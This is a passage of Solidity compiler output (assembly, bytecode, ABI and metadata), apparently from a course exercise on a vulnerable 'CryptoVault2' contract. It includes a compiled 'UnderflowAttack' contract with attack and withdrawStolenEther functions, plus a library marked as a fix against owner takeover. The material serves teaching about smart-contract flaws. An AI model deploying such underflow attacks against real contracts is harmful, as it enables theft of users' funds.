											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 19,
											"end": 20,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "EQ",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "35"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 67,
											"end": 71,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 61,
											"end": 72,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 134,
											"end": 138,
											"name": "PUSH",
											"source": -1,
											"value": "1F"
										},
										{
											"begin": 130,
											"end": 139,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 123,
											"end": 127,
											"name": "PUSH",
											"source": -1,
											"value": "3F"
										},
										{
											"begin": 105,
											"end": 121,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 101,
											"end": 128,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 97,
											"end": 140,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 94,
											"end": 95,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 141,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 88,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 77,
											"end": 142,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 157,
											"end": 173,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 154,
											"end": 155,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 147,
											"end": 174,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 211,
											"end": 227,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 208,
											"end": 209,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 201,
											"end": 205,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 194,
											"end": 206,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 179,
											"end": 228,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "34"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "tag",
											"source": -1,
											"value": "35"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 32,
											"end": 36,
											"name": "PUSH",
											"source": -1,
											"value": "60"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 36,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "tag",
											"source": -1,
											"value": "34"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8204,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8204,
											"end": 8297,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8204,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8316,
											"end": 8323,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "36"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH data",
											"source": 0,
											"value": "2BD668F41FFFB78302E8C697E28A55342028DDDD51FFAB0533D7565FD1F96173"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "tag",
											"source": 0,
											"value": "36"
										},
										{
											"begin": 8308,
											"end": 8367,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									],
									".data": {
										"2BD668F41FFFB78302E8C697E28A55342028DDDD51FFAB0533D7565FD1F96173": "4e6f2068616269646f20657869746f2061206c6120686f7261206465206465706f73697461722e",
										"653FDA1BE56379A9B0A26648001A0166E0A82C4C958ABB08BD69DF8FDCED27C3": "456e63696d61206465206c616472c3b36e20736f7920746f6e746f2079206e6f20736520617461636172",
										"F371FBDB092F2395CC186DBC470C83E478621C58586470025DE75A9DADAEC15C": "486173206465706f73697461646f20756e612063616e74696461642064656d61736961646f207065717565c3b161"
									}
								}
							}
						},
						"methodIdentifiers": {
							"attack(uint256)": "64dd891a",
							"deposit()": "d0e30db0",
							"withdrawStolenEther()": "24d8e86b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.4+commit.1dca32f3\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"at_contract\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"cantidad\",\"type\":\"uint256\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawStolenEther\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"PRACTICA 9/CryptoVault2.sol\":\"UnderflowAttack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"PRACTICA 9/CryptoVault2.sol\":{\"keccak256\":\"0xd47d0ccc73f25845eb52593e0e02f343d9ae0bdc04f9aeaac9d3895fd5cf5c65\",\"urls\":[\"bzz-raw://63d1cc1997da08857ae0a87ee61e0079573419566f3653b55f3e1014c9da055a\",\"dweb:/ipfs/QmTa6eRzByangAxzcA4PksJHpRdZsnD8HdMk1jin5rdH2o\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 301,
								"contract": "PRACTICA 9/CryptoVault2.sol:UnderflowAttack",
								"label": "attackedContract",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"VaultLib": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"PRACTICA 9/CryptoVault2.sol\":4489:6915  library VaultLib { /*Cambiando contract por library eliminamos las variables de estado evitando que pueda cambiar el owner.*/\r... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"PRACTICA 9/CryptoVault2.sol\":4489:6915  library VaultLib { /*Cambiando contract por library eliminamos las variables de estado evitando que pueda cambiar el owner.*/\r... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xa033fcd4\n      eq\n      tag_2\n      jumpi\n      dup1\n      0xf09a4016\n      eq\n      tag_3\n      jumpi\n    tag_1:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"PRACTICA 9/CryptoVault2.sol\":5893:6219  function collectFees(address storageOwner, uint storageFees) external onlyOwner(storageOwner) {\r... */\n    tag_2:\n      dup2\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_4\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_4:\n        /* \"PRACTICA 9/CryptoVault2.sol\":5893:6219  function collectFees(address storageOwner, uint storageFees) external onlyOwner(storageOwner) {\r... */\n      pop\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x40\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_6\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_6:\n        /* \"PRACTICA 9/CryptoVault2.sol\":5893:6219  function collectFees(address storageOwner, uint storageFees) external onlyOwner(storageOwner) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":5411:5670  function init(address storageOwner,address _owner) public {\r... */\n    tag_3:\n      dup2\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_8\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_8:\n        /* \"PRACTICA 9/CryptoVault2.sol\":5411:5670  function init(address storageOwner,address _owner) public {\r... */\n      pop\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x40\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_10:\n        /* \"PRACTICA 9/CryptoVault2.sol\":5411:5670  function init(address storageOwner,address _owner) public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_11\n      jump\t// in\n    tag_9:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":5893:6219  function collectFees(address storageOwner, uint storageFees) external onlyOwner(storageOwner) {\r... */\n    tag_7:\n        /* \"PRACTICA 9/CryptoVault2.sol\":5973:5985  storageOwner */\n      dup2\n        /* \"PRACTICA 9/CryptoVault2.sol\":5128:5140  storageOwner */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":5114:5140  msg.sender == storageOwner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":5114:5124  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":5114:5140  msg.sender == storageOwner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"PRACTICA 9/CryptoVault2.sol\":5106:5175  require(msg.sender == storageOwner,\"You are not the contract owner!\") */\n      tag_13\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1f\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x596f7520617265206e6f742074686520636f6e7472616374206f776e65722100\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_13:\n        /* \"PRACTICA 9/CryptoVault2.sol\":6021:6022  0 */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":6007:6018  storageFees */\n      dup3\n        /* \"PRACTICA 9/CryptoVault2.sol\":6007:6022  storageFees > 0 */\n      gt\n        /* \"PRACTICA 9/CryptoVault2.sol\":5998:6044  require (storageFees > 0, \"No fees collected\") */\n      tag_15\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x11\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4e6f206665657320636f6c6c6563746564000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_15:\n        /* \"PRACTICA 9/CryptoVault2.sol\":6055:6064  uint fees */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":6067:6078  storageFees */\n      dup3\n        /* \"PRACTICA 9/CryptoVault2.sol\":6055:6078  uint fees = storageFees */\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":6102:6103  0 */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":6089:6103  storageFees= 0 */\n      swap3\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":6115:6124  bool sent */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":6130:6142  storageOwner */\n      dup5\n        /* \"PRACTICA 9/CryptoVault2.sol\":6130:6147  storageOwner.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":6155:6159  fees */\n      dup3\n        /* \"PRACTICA 9/CryptoVault2.sol\":6130:6164  storageOwner.call{value: fees}(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_17)\n        /* \"--CODEGEN--\":14:41   */\n    tag_18:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_17:\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":6114:6164  (bool sent, ) = storageOwner.call{value: fees}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":6183:6187  sent */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":6175:6211  require(sent, \"Failed to send fees\") */\n      tag_19\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x13\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4661696c656420746f2073656e64206665657300000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_19:\n        /* \"PRACTICA 9/CryptoVault2.sol\":5186:5187  _ */\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":5893:6219  function collectFees(address storageOwner, uint storageFees) external onlyOwner(storageOwner) {\r... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":5411:5670  function init(address storageOwner,address _owner) public {\r... */\n    tag_11:\n        /* \"PRACTICA 9/CryptoVault2.sol\":5512:5513  0 */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":5488:5514  storageOwner == address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":5488:5500  storageOwner */\n      dup3\n        /* \"PRACTICA 9/CryptoVault2.sol\":5488:5514  storageOwner == address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"PRACTICA 9/CryptoVault2.sol\":5480:5571  require(storageOwner == address(0), \"El owner ya ha sido modificado y no puede cambiarse.\") */\n      tag_21\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x34\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_8b2c0cc110cb22f213ae6d036672ad90f933d31d663e6d083b02fb50136231c8\n      0x34\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_21:\n        /* \"PRACTICA 9/CryptoVault2.sol\":5656:5662  _owner */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":5641:5662  storageOwner = _owner */\n      swap2\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":5411:5670  function init(address storageOwner,address _owner) public {\r... */\n      pop\n      pop\n      jump\t// out\n    stop\n    data_8b2c0cc110cb22f213ae6d036672ad90f933d31d663e6d083b02fb50136231c8 456c206f776e6572207961206861207369646f206d6f646966696361646f2079206e6f2070756564652063616d6269617273652e\n\n    auxdata: 0xa26469706673582212203dbb2161a3a0aff0ba0a971af5f347072b7d24a87855ad12210f904c5107a51b64736f6c63430006040033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "61040b610026600b82828239805160001a60731461001957fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600436106100405760003560e01c8063a033fcd414610045578063f09a4016146100a0575b600080fd5b81801561005157600080fd5b5061009e6004803603604081101561006857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610111565b005b8180156100ac57600080fd5b5061010f600480360360408110156100c357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610315565b005b818073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146101b3576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f596f7520617265206e6f742074686520636f6e7472616374206f776e6572210081525060200191505060405180910390fd5b60008211610229576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260118152602001807f4e6f206665657320636f6c6c656374656400000000000000000000000000000081525060200191505060405180910390fd5b60008290506000925060008473ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d8060008114610292576040519150601f19603f3d011682016040523d82523d6000602084013e610297565b606091505b505090508061030e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f4661696c656420746f2073656e6420666565730000000000000000000000000081525060200191505060405180910390fd5b5050505050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161461039a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260348152602001806103a26034913960400191505060405180910390fd5b809150505056fe456c206f776e6572207961206861207369646f206d6f646966696361646f2079206e6f2070756564652063616d6269617273652ea26469706673582212203dbb2161a3a0aff0ba0a971af5f347072b7d24a87855ad12210f904c5107a51b64736f6c63430006040033",
